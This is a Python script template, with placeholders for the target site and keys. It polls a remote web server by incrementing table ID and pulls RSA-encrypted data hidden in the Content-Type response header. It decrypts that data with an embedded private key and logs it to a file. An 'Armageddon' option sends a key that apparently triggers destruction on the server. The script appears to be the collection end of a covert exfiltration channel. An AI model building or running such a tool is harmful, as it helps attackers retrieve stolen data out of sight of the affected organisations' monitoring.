# Libraries
import requests, argparse, rsa
from rsa import PrivateKey
# Initialization
parser = argparse.ArgumentParser()
parser.add_argument("-sp", "--stingerPath", help="File Path", required=False, default="output.txt")
parser.add_argument("-sa", "--stingerArmageddon" ,help="Armageddon (True/False)", required=False, default="FALSE")
parser.add_argument("-sv", "--stingerVerbose", help="Verbose (True/False)", required=False, default="TRUE")
# Read arguments from command line
args = parser.parse_args()
# Header
headers = {
    "Accept": "{{getKey}}",
}
# Starting Point
start = {{tableBegin}}
# Private key
privateKey = {{privateKey}}

try:
    if(args.stingerArmageddon.upper() == "TRUE"):
        request = requests.get("{{website}}",params={"ARMAGEDDON":"{{armageddonKey}}"},headers=headers)
        if(request.status_code == 200):
            print("Armageddon Successful")
            exit(0)
    
    while True:
        request = requests.get("{{website}}",params={"{{tableID}}":start},headers=headers)
        if(request.status_code == 200 and str(request.headers.get("Content-Type")) != "None"):
            requestData = request.headers.get("Content-Type")
            requestData = rsa.decrypt(bytes.fromhex(requestData), privateKey).decode() + "\n"
            file = open(args.stingerPath, "a")
            file.write(requestData)
            start = start + 1
            if(args.stingerVerbose.upper() == "TRUE"):
                print("Data : " + requestData)
        else:
            if(request.status_code != 200 and args.stingerVerbose.upper() == "TRUE"):
                print("Request Error")
            elif(args.stingerVerbose.upper() == "TRUE"):
                print("No Data")
        
except Exception as e:
    print("Error : " + str(e))
    exit(1)